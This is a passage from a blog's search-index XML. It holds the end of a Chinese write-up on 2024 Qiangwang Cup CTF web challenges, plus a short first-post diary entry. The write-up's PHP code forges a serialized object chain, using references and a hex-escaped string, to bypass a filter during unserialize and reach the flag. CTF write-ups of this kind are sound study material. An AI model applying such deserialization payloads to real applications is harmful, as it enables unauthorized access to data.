class="hljs-string">&quot;2024qwb&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;root#get\n&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;value = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>];<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;hello:&quot;</span>.<span class="hljs-variable">$this</span>-&gt;value);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;user#__invoke\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;password-&gt;<span class="hljs-title function_ invoke__">guess</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;user#__destruct\n&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == <span class="hljs-number">0</span> )&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;username;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>();<br><span class="hljs-variable">$root1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">root</span>();<br><span class="hljs-variable">$user1</span>-&gt;username = &amp;<span class="hljs-variable">$root1</span>-&gt;value;<br><span class="hljs-variable">$root1</span>-&gt;username = <span class="hljs-variable">$user1</span>;<br><span class="hljs-variable">$ser_data2</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$root1</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$ser_data2</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$ser_data1</span> = <span class="hljs-string">&#x27;O:4:&quot;root&quot;:2:&#123;s:8:&quot;username&quot;;O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;S:7:&quot;2024\71wb&quot;;s:8:&quot;password&quot;;N;s:5:&quot;value&quot;;N;&#125;s:5:&quot;value&quot;;R:3;&#125;&#x27;</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$ser_data1</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$user</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$user</span>-&gt;password == <span class="hljs-string">&quot;2024qwb&quot;</span>)&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello!&quot;</span>;<br> &#125;<br></code></pre></td></tr></table></figure><h2 id="Playground"><a href="#Playground" class="headerlink" title="Playground"></a>Playground</h2><p>这是道关于Go语言的，有时间再复现</p><h2 id="Proxy-revenge"><a href="#Proxy-revenge" class="headerlink" title="Proxy_revenge"></a>Proxy_revenge</h2><p>这也是</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>开启我的博客之旅</title>
    <link href="/2024/11/04/%E5%BC%80%E5%90%AF%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%B9%8B%E6%97%85/"/>
    <url>/2024/11/04/%E5%BC%80%E5%90%AF%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%B9%8B%E6%97%85/</url>
    
    <content type="html"><![CDATA[<p>就在这一天！我搭建起了自己的博客!希望以后养成记录知识和生活的好习惯 Come on！</p><span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>日记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
